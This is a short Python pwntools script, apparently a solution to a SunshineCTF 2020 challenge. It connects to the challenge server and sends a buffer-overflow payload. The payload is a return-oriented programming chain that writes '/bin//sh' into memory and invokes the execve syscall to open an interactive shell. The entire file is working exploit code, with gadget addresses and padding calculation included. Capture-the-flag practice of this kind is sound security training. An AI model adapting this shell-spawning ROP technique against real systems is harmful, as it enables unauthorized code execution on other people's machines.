from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30014)
# sh = process('./chall_14')

p1 = 'abc'

padding = cyclic_find(0x62616162)
print('padding:', padding)

data = 0x06b90e0
p = cyclic(padding)
p += p64(0x0410263)  # pop rsi; ret;
p += p64(data)  # address of data section
p += p64(0x04158f4)  # pop rax; ret;
p += b'/bin//sh'
p += p64(0x047f401)  # mov qword ptr [rsi], rax; ret;
p += p64(0x0400696)  # pop rdi; ret;
p += p64(data)  # address of data section
p += p64(0x044c0a9)  # pop rdx; pop rsi; ret;
p += p64(0)  # set rdx to 0
p += p64(0)  # set rsi to 0
p += p64(0x04158f4)  # pop rax; ret;
p += p64(59)  # set rax to 59
p += p64(0x0474e35)  # syscall; ret;

with open('payload', 'w') as f:
    f.write(p1 + "\n")

with open('payload', 'ab') as f:
    f.write(p)

# Doesn't print line on remote for some reason
# sh.recvline()
sh.sendline(p1)

sh.sendline(p)
sh.interactive()
